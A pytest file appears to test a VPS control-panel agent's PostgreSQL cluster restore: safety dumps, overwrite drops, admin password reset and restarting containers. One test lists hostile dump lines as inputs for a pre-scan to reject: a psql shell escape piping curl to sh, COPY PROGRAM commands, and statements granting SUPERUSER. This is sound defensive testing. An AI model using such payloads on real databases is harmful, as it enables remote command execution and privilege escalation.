import gzip
import hashlib
import threading
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from tests.fakes import FakeRunner
from vpscp_agent.jobs import Job, JobContext, JobManager
from vpscp_agent.main import create_app
from vpscp_agent.pg import Psql, quote_ident
from vpscp_agent.restore import UploadStore, restore_cluster
from vpscp_agent.state import StateDB

TINY_DUMP_PLAIN = (
    b"--\n-- PostgreSQL database cluster dump\n--\n"
    b"CREATE ROLE app_user;\nCREATE DATABASE app WITH ...;\n"
)
TINY_DUMP = gzip.compress(TINY_DUMP_PLAIN)


@pytest.fixture
def restore_job_env(settings):
    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text(
        "POSTGRES_USER=pgadmin\nPOSTGRES_PASSWORD=stack-admin-secret\n"
    )
    settings.apps_dir.mkdir(parents=True)
    runner = FakeRunner()
    db = StateDB(settings.state_db_path)
    db.migrate()
    psql = Psql(settings, runner)
    store = UploadStore(settings)
    return settings, runner, db, psql, store


def _complete_upload(store: UploadStore, data: bytes, filename: str = "cluster.sql.gz") -> str:
    upload_id = store.create(filename, len(data))
    store.append(upload_id, 0, data)
    digest = hashlib.sha256(data).hexdigest()
    store.complete(upload_id, digest)
    return upload_id


def _compose_project(apps_dir: Path, slug: str) -> Path:
    project = apps_dir / slug
    project.mkdir(parents=True)
    (project / "docker-compose.yml").write_text("services: {}\n")
    return project


def _ctx(db: StateDB) -> JobContext:
    job = Job(kind="test", params={})
    JobManager(db)._jobs[job.id] = job
    return JobContext(job)


def test_empty_cluster_skips_stop_and_safety_dump(restore_job_env):
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    runner.on("LIMIT 1", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=["ok"], returncode=0)

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
    )

    assert result["safety_dump"] is None
    assert not any(c["args"][1:3] == ["compose", "-p"] for c in runner.calls)
    assert runner.stream_calls == []
    assert runner.stream_gzip_calls == []
    assert runner.pipe_through_calls
    assert result["error_count"] == 0


def test_nonempty_cluster_stop_safety_load_reset_start(restore_job_env):
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    project = _compose_project(settings.apps_dir, "budgethq")
    with db.connect() as conn:
        conn.execute(
            "INSERT INTO db_attachment (db_name, db_user, slug, attached_at) VALUES (?, ?, ?, ?)",
            ("budgethq", "budgethq_user", "budgethq", "2020-01-01T00:00:00+00:00"),
        )

    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="appuser\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(
        lines=["NOTICE: ok", 'psql:<stdin>:18: ERROR:  role "pgadmin" already exists'],
        returncode=0,
    )

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
        overwrite=True,
    )

    dump_args = runner.stream_gzip_calls[0]["args"]
    assert dump_args[:3] == ["docker", "exec", settings.pg_container]
    assert "pg_dumpall" in dump_args
    safety_path = runner.stream_gzip_calls[0]["path"]
    assert safety_path.name.startswith("safety-") and safety_path.name.endswith(".sql.gz")
    assert result["safety_dump"] is not None
    assert result["safety_dump"].endswith(".sql.gz")
    assert result["error_count"] == 0
    assert result["benign_errors"] == 1

    admin_sql = f"\\getenv pw VPSCP_PW\nALTER ROLE {quote_ident('pgadmin')} WITH PASSWORD :'pw';\n"

    def _call_index(match) -> int:
        for index, call in enumerate(runner.calls):
            if match(call):
                return index
        raise AssertionError("expected runner call not found")

    stop_i = _call_index(
        lambda c: (
            c["args"][:5] == ["docker", "compose", "-p", "budgethq", "stop"]
            and c["cwd"] == project.resolve()
        )
    )
    reset_i = _call_index(
        lambda c: (
            isinstance(c.get("input_data"), str)
            and admin_sql in c["input_data"]
            and c["extra_env"] == {"VPSCP_PW": "stack-admin-secret"}
        )
    )
    start_i = _call_index(
        lambda c: (
            c["args"][:5] == ["docker", "compose", "-p", "budgethq", "start"]
            and c["cwd"] == project.resolve()
        )
    )
    assert stop_i < reset_i < start_i
    assert runner.stream_gzip_calls and runner.pipe_through_calls


def test_restore_fails_on_nonzero_psql_returncode(restore_job_env):
    """A non-zero psql exit must fail the job, not be silently ignored."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    runner.on("LIMIT 1", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=["NOTICE: fine"], returncode=3)

    with pytest.raises(Exception, match="restore failed"):
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
        )


def test_restore_fails_on_unexpected_errors(restore_job_env):
    """Any ERROR line other than the benign admin-role collision fails the job.

    This is the silent mis-application bug: a re-restore produced
    'already exists' errors for every object while reporting success.
    """
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    runner.on("LIMIT 1", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(
        lines=[
            'psql:<stdin>:98: ERROR:  database "appdb" already exists',
            'psql:<stdin>:16: ERROR:  role "appuser" already exists',
        ],
        returncode=0,
    )

    with pytest.raises(Exception, match="restore failed"):
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
        )


def test_restore_allows_admin_role_collision(restore_job_env):
    """Real pg_dumpall output always contains CREATE ROLE <admin>, which
    collides with the stack's admin role. That single collision is benign
    (verified against postgres:16) and must not fail an otherwise clean load.
    """
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    runner.on("LIMIT 1", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(
        lines=[
            "CREATE ROLE",
            'psql:<stdin>:18: ERROR:  role "pgadmin" already exists',
            "ALTER ROLE",
        ],
        returncode=0,
    )

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
    )

    assert result["error_count"] == 0
    assert result["benign_errors"] == 1


def test_restore_refuses_nonempty_cluster_without_overwrite(restore_job_env):
    """Restoring over an existing cluster must refuse with the drop list
    instead of silently mis-applying the dump."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    runner.on("LIMIT 1", stdout="1\n")
    runner.on("d.datname FROM pg_database", stdout="appdb\ngmail_manager\n")
    runner.on("r.rolname FROM pg_roles", stdout="appuser\ngmail_user\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")

    with pytest.raises(Exception, match="cluster is not empty") as excinfo:
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
        )
    message = str(excinfo.value)
    assert "appdb" in message
    assert "gmail_manager" in message
    assert "appuser" in message
    # nothing was loaded, dropped, or dumped: refusal happens before any mutation
    assert runner.pipe_through_calls == []
    assert runner.stream_gzip_calls == []
    assert not any("DROP" in (c.get("input_data") or "") for c in runner.calls)


def test_restore_overwrite_drops_objects_then_loads(restore_job_env):
    """overwrite=True drops the non-system databases and roles (except the
    admin) before loading, so the dump applies cleanly."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    project = _compose_project(settings.apps_dir, "budgethq")
    with db.connect() as conn:
        conn.execute(
            "INSERT INTO db_attachment (db_name, db_user, slug, attached_at) VALUES (?, ?, ?, ?)",
            ("budgethq", "budgethq_user", "budgethq", "2020-01-01T00:00:00+00:00"),
        )

    runner.on("LIMIT 1", stdout="1\n")
    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="pgadmin\nappuser\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(
        lines=['psql:<stdin>:18: ERROR:  role "pgadmin" already exists'],
        returncode=0,
    )

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
        overwrite=True,
    )

    assert result["safety_dump"] is not None
    drop_calls = [c for c in runner.calls if "DROP" in (c.get("input_data") or "")]
    drop_sql = " ".join(c["input_data"] for c in drop_calls)
    assert "DROP DATABASE IF EXISTS" in drop_sql and "appdb" in drop_sql
    assert "DROP ROLE IF EXISTS" in drop_sql and "appuser" in drop_sql
    # admin role must never be dropped
    assert "pgadmin" not in drop_sql
    assert result["error_count"] == 0

    def _call_index(match) -> int:
        for index, call in enumerate(runner.calls):
            if match(call):
                return index
        raise AssertionError("expected runner call not found")

    stop_i = _call_index(lambda c: c["args"][:5] == ["docker", "compose", "-p", "budgethq", "stop"])
    drop_i = _call_index(lambda c: "DROP DATABASE" in (c.get("input_data") or ""))
    reset_i = _call_index(
        lambda c: (
            isinstance(c.get("input_data"), str)
            and "ALTER ROLE" in c["input_data"]
            and "PASSWORD" in c["input_data"]
        )
    )
    start_i = _call_index(
        lambda c: c["args"][:5] == ["docker", "compose", "-p", "budgethq", "start"]
    )
    assert stop_i < drop_i < reset_i < start_i
    assert runner.pipe_through_calls
    assert project.exists()


REAL_DUMP_META = (
    b"--\n-- PostgreSQL database cluster dump\n--\n"
    rb"\restrict abc123"
    + b"\n"
    + b"SET default_transaction_read_only = off;\n"
    + b"CREATE ROLE appuser;\n"
    + b"ALTER ROLE pgadmin WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN PASSWORD 'x';\n"
    + rb"\unrestrict abc123"
    + b"\n"
    + rb"\connect template1"
    + b"\n"
    + b"CREATE DATABASE appdb WITH TEMPLATE = template0 ENCODING = 'UTF8';\n"
    + rb"\connect appdb"
    + b"\n"
)


def test_prescan_accepts_real_dumpall_meta_commands(restore_job_env):
    r"""Real pg_dumpall output contains \restrict/\unrestrict/\connect lines;
    the pre-scan must not reject them or every legit restore fails."""
    settings, runner, db, psql, store = restore_job_env
    import gzip

    upload_id = _complete_upload(store, gzip.compress(REAL_DUMP_META))
    runner.on("d.datname FROM pg_database", stdout="")
    runner.on("r.rolname FROM pg_roles", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=[], returncode=0)

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
    )
    assert result["error_count"] == 0


@pytest.mark.parametrize(
    "payload",
    [
        rb"\! /bin/sh -c 'curl evil | sh'",
        b"COPY public.t FROM PROGRAM 'curl evil';",
        b"COPY (SELECT 1) TO PROGRAM 'bash -c id';",
        b"CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x';",
        b"ALTER ROLE appuser WITH SUPERUSER;",
    ],
)
def test_prescan_rejects_dangerous_statements(restore_job_env, payload):
    """A restored dump executes as the postgres superuser: psql meta-commands
    and COPY PROGRAM are OS command execution; SUPERUSER grants persist after
    the restore. Reject before loading."""
    settings, runner, db, psql, store = restore_job_env
    import gzip

    dump = b"--\n-- PostgreSQL database cluster dump\n--\n" + payload + b"\n"
    upload_id = _complete_upload(store, gzip.compress(dump))

    with pytest.raises(Exception, match="forbidden"):
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
        )
    assert runner.pipe_through_calls == []


def test_restore_failure_still_restarts_projects_and_resets_admin(restore_job_env):
    """try/finally: a load that raises must not strand stopped project
    containers or leave the admin password as the dump set it."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    project = _compose_project(settings.apps_dir, "budgethq")
    with db.connect() as conn:
        conn.execute(
            "INSERT INTO db_attachment (db_name, db_user, slug, attached_at) VALUES (?, ?, ?, ?)",
            ("budgethq", "budgethq_user", "budgethq", "2020-01-01T00:00:00+00:00"),
        )

    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="appuser\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    # the load itself blows up (e.g. psql dies mid-stream)
    runner.pipe_through_calls  # noqa: B018 - clarity
    from tests.fakes import CommandResult  # noqa: F401

    def explode(*args, **kwargs):
        raise RuntimeError("psql died")

    runner.pipe_through = explode  # type: ignore[method-assign]

    with pytest.raises(RuntimeError, match="psql died"):
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
            overwrite=True,
        )

    args_seen = [c["args"] for c in runner.calls]
    assert any(a[:5] == ["docker", "compose", "-p", "budgethq", "stop"] for a in args_seen)
    assert any(a[:5] == ["docker", "compose", "-p", "budgethq", "start"] for a in args_seen), (
        "stopped projects must be restarted even when the load fails"
    )
    reset_sql_calls = [
        c
        for c in runner.calls
        if isinstance(c.get("input_data"), str) and "ALTER ROLE" in c["input_data"]
    ]
    assert reset_sql_calls, "admin password must be reset even when the load fails"
    assert project.exists()


def test_job_records_survive_agent_restart(restore_job_env):
    """JobManager keeps jobs in memory only: an agent restart (e.g. update.sh)
    loses the record and the setup wizard hangs at 'pending'. Terminal job
    records must round-trip through state.db."""
    from vpscp_agent.jobs import JobManager

    _settings, _runner, db, _psql, _store = restore_job_env

    manager = JobManager(db)
    job = manager.start("db.restore_cluster", {"upload_id": "abc"}, lambda _ctx: {"ok": True})
    manager.wait(job.id, timeout=5)

    # simulate agent restart: a fresh manager over the same state.db
    reborn = JobManager(db)
    recovered = reborn.get(job.id)
    assert recovered is not None, "job record must survive an agent restart"
    assert recovered.status == "succeeded"
    listing = reborn.list()
    assert any(j.id == job.id for j in listing)


def test_safety_dump_uses_generous_timeout(restore_job_env):
    """pg_dumpall of a real cluster takes minutes; the old 120s hard cap
    aborted the overwrite path mid-safety-dump (Task 19: raise the cap)."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    _compose_project(settings.apps_dir, "budgethq")
    with db.connect() as conn:
        conn.execute(
            "INSERT INTO db_attachment (db_name, db_user, slug, attached_at) VALUES (?, ?, ?, ?)",
            ("budgethq", "budgethq_user", "budgethq", "2020-01-01T00:00:00+00:00"),
        )
    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="appuser\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=[], returncode=0)

    restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
        overwrite=True,
    )
    assert runner.stream_gzip_calls, "safety dump expected"
    timeout = runner.stream_gzip_calls[0]["timeout"]
    assert timeout >= 1800, f"safety dump timeout too small: {timeout}"


def test_reset_failure_still_restarts_projects(restore_job_env):
    """Nested finally: even if the admin password reset raises, stopped
    project containers must be restarted."""
    settings, runner, db, psql, store = restore_job_env
    upload_id = _complete_upload(store, TINY_DUMP)
    _compose_project(settings.apps_dir, "budgethq")
    with db.connect() as conn:
        conn.execute(
            "INSERT INTO db_attachment (db_name, db_user, slug, attached_at) VALUES (?, ?, ?, ?)",
            ("budgethq", "budgethq_user", "budgethq", "2020-01-01T00:00:00+00:00"),
        )
    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="appuser\n")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=[], returncode=0)

    # simulate missing POSTGRES_PASSWORD: reset_admin_password raises
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\n")

    with pytest.raises(ValueError, match="POSTGRES_PASSWORD"):
        restore_cluster(
            _ctx(db),
            settings=settings,
            psql=psql,
            runner=runner,
            db=db,
            upload_id=upload_id,
            overwrite=True,
        )
    args_seen = [c["args"] for c in runner.calls]
    assert any(a[:5] == ["docker", "compose", "-p", "budgethq", "start"] for a in args_seen), (
        "projects must restart even when the admin password reset fails"
    )


def test_restore_run_refuses_while_deploy_locked(settings):
    """Review-focus: a deploy with migrations during a cluster restore runs
    Alembic against a half-loaded cluster (and its connection can block the
    overwrite's DROP DATABASE). The two must be mutually exclusive."""
    from fastapi.testclient import TestClient

    from tests.fakes import FakeRunner
    from vpscp_agent.main import create_app
    from vpscp_agent.state import StateDB

    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\nPOSTGRES_PASSWORD=secret\n")
    runner = FakeRunner()
    db = StateDB(settings.state_db_path)
    db.migrate()
    store = UploadStore(settings)
    upload_id = _complete_upload(store, TINY_DUMP)

    with TestClient(create_app(settings, runner=runner)) as client:
        mgr = client.app.state.jobs
        gate = threading.Event()
        mgr.start("project.deploy", {}, lambda _ctx: gate.wait(timeout=30), lock_key="deploy:myapp")
        try:
            resp = client.post(
                "/v1/restore/run",
                json={"upload_id": upload_id, "confirm": "RESTORE"},
            )
            assert resp.status_code == 409
            assert "deploy" in resp.text.lower()
        finally:
            gate.set()


def test_prescan_accepts_copy_data_sections(restore_job_env):
    """Every real pg_dump with rows emits 'COPY ... FROM stdin;' terminated by
    a bare '\\.' line — the COPY data terminator. Rejecting it broke every
    restore of a dump with actual data (caught by the CI integration test)."""
    settings, runner, db, psql, store = restore_job_env
    dump = (
        b"--\n-- PostgreSQL database cluster dump\n--\n"
        b"CREATE DATABASE appdb;\n"
        b"\\connect appdb\n"
        b"COPY public.seed_row (id) FROM stdin;\n"
        b"42\n"
        b"\\.\n"
        b"\n-- dump complete\n"
    )
    upload_id = _complete_upload(store, gzip.compress(dump))
    runner.on("d.datname FROM pg_database", stdout="")
    runner.on("r.rolname FROM pg_roles", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="pgadmin\n")
    runner.set_pipe_through(lines=[], returncode=0)

    result = restore_cluster(
        _ctx(db),
        settings=settings,
        psql=psql,
        runner=runner,
        db=db,
        upload_id=upload_id,
    )
    assert result["error_count"] == 0


def test_wrong_confirm_returns_400(settings):
    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\n")
    with TestClient(create_app(settings, runner=FakeRunner())) as client:
        resp = client.post(
            "/v1/restore/run",
            json={"upload_id": "abc", "confirm": "NOPE"},
        )
    assert resp.status_code == 400


@pytest.fixture
def db_client(settings):
    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\n")
    runner = FakeRunner()
    with TestClient(create_app(settings, runner=runner)) as client:
        yield client, runner


def test_concurrent_db_create_returns_409(db_client):
    client, runner = db_client
    runner.on("pg_database", stdout="")
    runner.on("pg_roles", stdout="")
    gate = threading.Event()
    mgr = client.app.state.jobs

    mgr.start("demo.block", {}, lambda _ctx: gate.wait(timeout=30), lock_key="postgres")
    try:
        resp = client.post(
            "/v1/db/create",
            json={"slug": "budgethq", "db_name": "budgethq", "db_user": "budgethq_user"},
        )
        assert resp.status_code == 409
    finally:
        gate.set()


def test_restore_run_refuses_nonempty_without_overwrite(settings):
    """The route pre-checks emptiness and returns 409 with the drop list so the
    UI can show what overwrite would remove."""
    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\nPOSTGRES_PASSWORD=secret\n")
    runner = FakeRunner()
    runner.on("LIMIT 1", stdout="1\n")
    runner.on("d.datname FROM pg_database", stdout="appdb\n")
    runner.on("r.rolname FROM pg_roles", stdout="pgadmin\nappuser\n")
    store = UploadStore(settings)
    upload_id = _complete_upload(store, TINY_DUMP)

    with TestClient(create_app(settings, runner=runner)) as client:
        resp = client.post(
            "/v1/restore/run",
            json={"upload_id": upload_id, "confirm": "RESTORE"},
        )
        assert resp.status_code == 409
        detail = resp.json()["detail"]
        assert detail["code"] == "cluster_not_empty"
        assert detail["databases"] == ["appdb"]
        assert detail["roles"] == ["appuser"]
        assert runner.pipe_through_calls == []

        runner.set_pipe_through(lines=[], returncode=0)
        runner.on("ORDER BY 1", stdout="")
        runner.on("pg_roles", stdout="pgadmin\n")
        resp = client.post(
            "/v1/restore/run",
            json={"upload_id": upload_id, "confirm": "RESTORE", "overwrite": True},
        )
        assert resp.status_code == 202


def test_restore_run_starts_job(settings):
    settings.stack_dir.mkdir(parents=True)
    settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\nPOSTGRES_PASSWORD=secret\n")
    runner = FakeRunner()
    runner.on("LIMIT 1", stdout="")
    runner.on("ORDER BY 1", stdout="")
    runner.on("pg_roles", stdout="")
    runner.set_pipe_through(lines=[], returncode=0)
    store = UploadStore(settings)
    upload_id = _complete_upload(store, TINY_DUMP)

    with TestClient(create_app(settings, runner=runner)) as client:
        resp = client.post(
            "/v1/restore/run",
            json={"upload_id": upload_id, "confirm": "RESTORE"},
        )
        assert resp.status_code == 202
        job_id = resp.json()["job_id"]
        job = client.app.state.jobs.get(job_id)
        assert job is not None
        assert job.kind == "db.restore_cluster"
        client.app.state.jobs.wait(job_id, timeout=5)
        done = client.app.state.jobs.get(job_id)
        assert done.status == "succeeded", done.error
